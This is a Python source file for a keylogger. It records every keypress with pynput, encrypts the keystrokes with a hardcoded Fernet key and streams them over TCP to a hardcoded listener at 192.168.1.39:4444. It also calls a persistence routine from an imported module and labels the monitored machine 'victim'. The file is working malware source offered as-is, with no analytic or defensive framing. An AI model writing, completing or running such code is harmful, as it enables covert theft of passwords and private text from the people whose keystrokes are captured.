from pynput.keyboard import Listener 
import socket
from cryptography.fernet import Fernet
import sys
import manipulate


class Keylogger():

	def __init__(self, Host, Port, crypt_key):

		self.__Host = Host
		self.__Port = Port
		self.client = None
		self.client_connect = False
		self.fail = False
		self.__crypt = Fernet(crypt_key)
		self.__key_to_discard = [

			"Key.esc", "Key.ctrl", "Key.alt",
			"Key.shift", "Key.caps_lock", "Key.backspace",
			"Key.tab", "Key.right", "Key.ctrl_l", "key.alt_l",
			"Key.cmdr", "Key.cmd"

		]

	def connect_server(self):

		try:
				
			self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			Address = (self.__Host, self.__Port)
			self.client.connect(Address)
			print(f"Connected to {self.__Host}:{self.__Port}")
			self.client_connect = True
		
		except ConnectionRefusedError:

			print("Could not connect to the Server")
			print("Make sure the Server is listening for connection...")
			self.fail = True
		
	def persistance(self):

		manipulate.path_manipulation()
	
	def write_to_file(self, key):

		keystroke = str(key)
		keystroke = keystroke.replace("'",'')

		if keystroke =="Key.space":
			keystroke = " "
		elif keystroke == "Key.enter":
			keystroke = "\n"
		elif keystroke in self.__key_to_discard:
			keystroke = ""
		if keystroke:

			# byte_msg = keystroke.encode('utf-8')
			byte_msg = self.__crypt.encrypt(keystroke.encode('utf-8'))

			if self.client_connect:

				try: 
						
						self.client.sendall(byte_msg)

				except (ConnectionResetError, BrokenPipeError):
						
						print("\nServer has been disconnected")

						self.client.close()
						
						self.client_connect = False

						return False
				

if __name__ == '__main__':
	
	Host = "192.168.1.39"
	Port = 4444
	KEY = b"GLpnLBTkUsqcwT5TYpMgQT0c-W_Ust13ybM3ZK5whj8="
	victim = Keylogger(Host, Port, KEY)

	victim.persistance()
	victim.connect_server()

	if victim.fail:

		print("The program is now being terminated")
		
		sys.exit(1)

	try:

			with Listener(on_press=victim.write_to_file) as l:
			
				l.join()

	except KeyboardInterrupt:

				print("Program has been terminated")


